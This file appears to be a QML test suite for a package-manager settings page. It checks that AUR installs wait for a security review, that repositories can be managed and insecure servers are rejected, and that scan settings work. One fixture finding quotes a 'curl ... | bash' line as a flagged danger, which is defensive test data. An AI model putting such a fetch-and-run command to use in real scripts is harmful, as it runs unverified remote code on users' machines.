// Loads the Software page with a fake ctx (as uQ Settings would) and checks the review gate:
//   QT_QPA_PLATFORM=offscreen /usr/lib/qt6/bin/qmltestrunner -import tests/uq/stub -input tests/uq/tst_page.qml
// tests/uq/shots.sh runs it with shotsDir set, to save a screenshot of each state.
import QtQuick
import QtQuick.Controls as QQC2
import QtTest

Item {
    id: root
    width: 1000
    height: 720

    /// Where screenshots go; empty means none. Set by tests/uq/shots.sh.
    property string shotsDir: ""
    readonly property string hash: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
    readonly property var installedList: [
        { name: "htop", version: "3.4.1-1", repo: "extra", source: "repo", description: "Interactive process viewer", installed: true },
        { name: "firefox", version: "142.0-1", repo: "extra", source: "repo", description: "Fast, private and safe web browser", installed: true }
    ]
    readonly property var found: [
        { name: "btop", version: "1.4.0-1", repo: "extra", source: "repo", description: "A monitor of resources", installed: false },
        { name: "htop", version: "3.4.1-1", repo: "extra", source: "repo", description: "Interactive process viewer", installed: true },
        { name: "btop-git", version: "r123.abc-1", repo: "aur", source: "aur", description: "btop from git", installed: false }
    ]
    readonly property var review: ({ hash: root.hash, review: { findings: [
                    { severity: "danger", line: 14, text: "Downloads and runs a script directly.", snippet: "curl -s https://example.org/i.sh | bash" },
                    { severity: "warn", line: 6, text: "A source is not checksummed (SKIP).", snippet: "sha256sums=('SKIP')" }
                ] } })

    FakeContext {
        id: fake
        commands: ({
                installed: { code: 0, output: root.installedList },
                config: { code: 0, output: { aur_enabled: true, aur_update_diff: true, aur_show_risky: true } },
                search: { code: 0, output: root.found },
                "review-aur": { code: 0, output: root.review },
                "install-aur": { code: 0, output: null },
                install: { code: 0, output: null },
                remove: { code: 0, output: null },
                "config-set": { code: 0, output: { aur_enabled: false } },
                repos: { code: 0, output: [
                        { name: "core", enabled: true, origin: "official", servers: [], includes: ["/etc/pacman.d/mirrorlist"] },
                        { name: "extra", enabled: true, origin: "official", servers: [], includes: ["/etc/pacman.d/mirrorlist"] },
                        { name: "multilib", enabled: false, origin: "official", servers: [], includes: [] },
                        { name: "my-repo", enabled: true, origin: "added", servers: ["https://repo.example.org/$arch"], includes: [] }
                    ] },
                "repo-add": { code: 0, output: null },
                "repo-add-key": { code: 0, output: null },
                "repo-remove": { code: 0, output: null },
                "repo-official": { code: 0, output: null },
                "scan-aur": { code: 0, output: null },
                "scan-all": { code: 0, output: null }
            })
        events: ({
                "install-aur": [
                    { event: "step", id: "fetch-btop-git", state: "start" },
                    { event: "step", id: "fetch-btop-git", state: "done" },
                    { event: "step", id: "build-btop-git", state: "start" },
                    { event: "step", id: "build-btop-git", state: "output", detail: "==> Making package: btop-git r123.abc-1" }
                ]
            })
        confirmed: ["install", "remove", "repo-add", "repo-add-key", "repo-remove", "repo-official", "scan-aur", "scan-all"]
    }

    Loader {
        id: loader
        anchors.fill: parent
        source: Qt.resolvedUrl("../../uq/pages/software/Page.qml")
    }

    function find(item, pred) {
        if (pred(item))
            return item;
        for (let i = 0; i < item.children.length; i++) {
            const f = find(item.children[i], pred);
            if (f)
                return f;
        }
        if (item.contentItem && item.contentItem !== item)
            return find(item.contentItem, pred);
        return null;
    }

    TestCase {
        name: "SoftwarePage"
        when: windowShown

        function init() {
            fake.calls = [];
            loader.item.ctx = fake.ctx;
            wait(50);
            tab("Browse");
        }

        function shot(name) {
            const dir = root.shotsDir;
            wait(50);
            if (dir !== "")
                grabImage(root).save(dir + "/" + name + ".png");
        }

        function tab(name) {
            const b = root.find(loader.item, i => i.objectName === "tab-" + name);
            verify(b !== null, "tab " + name);
            b.clicked();
            wait(30);
        }

        function search() {
            const box = root.find(loader.item, i => i.objectName === "query");
            box.text = "btop";
            root.find(loader.item, i => i.objectName === "search").clicked();
            wait(100);
        }

        function test_a_search_lists_results_and_marks_installed() {
            search();
            compare(fake.calls.filter(c => c[0] === "run" && c[1] === "search").length, 1);
            verify(root.find(loader.item, i => i.objectName === "install-btop") !== null);
            verify(root.find(loader.item, i => i.objectName === "remove-htop") !== null);
            shot("browse-results");
        }

        function test_aur_install_stops_at_the_review_and_acks_its_hash() {
            search();
            root.find(loader.item, i => i.objectName === "install-btop-git").clicked();
            wait(100);
            compare(fake.calls.filter(c => c[1] === "install-aur").length, 0);
            const accept = root.find(loader.item, i => i.objectName === "accept-review");
            verify(accept !== null && accept.visible, "the review offers install");
            shot("aur-review");
            accept.clicked();
            wait(200);
            const run = fake.calls.filter(c => c[0] === "stream" && c[1] === "install-aur");
            compare(run.length, 1);
            compare(run[0][2], [root.hash, "btop-git"]);
            shot("aur-building");
        }

        function test_cancelling_the_review_runs_nothing() {
            search();
            root.find(loader.item, i => i.objectName === "install-btop-git").clicked();
            wait(100);
            root.find(loader.item, i => i.objectName === "dismiss-review").clicked();
            wait(50);
            compare(fake.calls.filter(c => c[1] === "install-aur").length, 0);
        }

        function test_repo_install_streams_behind_uqs_confirmation() {
            search();
            root.find(loader.item, i => i.objectName === "install-btop").clicked();
            wait(100);
            compare(fake.calls.filter(c => c[0] === "stream" && c[1] === "install").length, 1);
        }

        function test_installed_tab_and_settings() {
            tab("Installed");
            shot("installed");
            tab("Settings");
            shot("settings");
        }

        function named(n) {
            return root.find(loader.item, i => i.objectName === n);
        }

        function test_repositories_switch_add_and_remove() {
            tab("Repositories");
            shot("repositories");
            verify(named("repo-switch-multilib") !== null && named("repo-switch-multilib").visible, "multilib can be switched");
            verify(named("repo-switch-core") === null || !named("repo-switch-core").visible, "core cannot");
            named("repo-switch-multilib").checked = true;
            named("repo-switch-multilib").toggled();
            wait(150);
            compare(fake.calls.filter(c => c[0] === "stream" && c[1] === "repo-official").map(c => c[2]), [["multilib", "on"]]);
            named("repo-remove-my-repo").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[1] === "repo-remove").map(c => c[2]), [["my-repo"]]);
            verify(named("repo-remove-core") === null || !named("repo-remove-core").visible, "official repos aren't removable");
            named("repo-name").text = "other";
            named("repo-server").text = "https://other.example.org/$arch";
            named("repo-add").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[1] === "repo-add").map(c => c[2]), [["other", "https://other.example.org/$arch"]]);
            named("repo-key").text = "0123456789ABCDEF0123456789ABCDEF01234567";
            named("repo-add").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[1] === "repo-add-key").map(c => c[2]), [["0123456789ABCDEF0123456789ABCDEF01234567", "other", "https://other.example.org/$arch"]]);
        }

        function test_a_bad_server_never_reaches_the_command() {
            tab("Repositories");
            named("repo-name").text = "other";
            named("repo-server").text = "http://insecure.example.org/";
            named("repo-add").clicked();
            wait(100);
            compare(fake.calls.filter(c => c[1] === "repo-add").length, 0);
        }

        function test_scan_buttons_and_the_install_scan_setting() {
            tab("Scan");
            shot("scan");
            named("scan-all").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[1] === "scan-all").length, 1);
            named("scan-aur").clicked();
            wait(150);
            compare(fake.calls.filter(c => c[1] === "scan-aur").length, 1);
            named("set-scan_installs").activated(2);
            wait(150);
            compare(fake.calls.filter(c => c[1] === "config-set").map(c => c[2]), [["scan_installs", "all"]]);
        }

        function test_settings_write_words_and_switches() {
            tab("Settings");
            named("set-view").activated(1);
            wait(150);
            compare(fake.calls.filter(c => c[1] === "config-set").map(c => c[2]), [["view", "grid"]]);
        }
    }
}
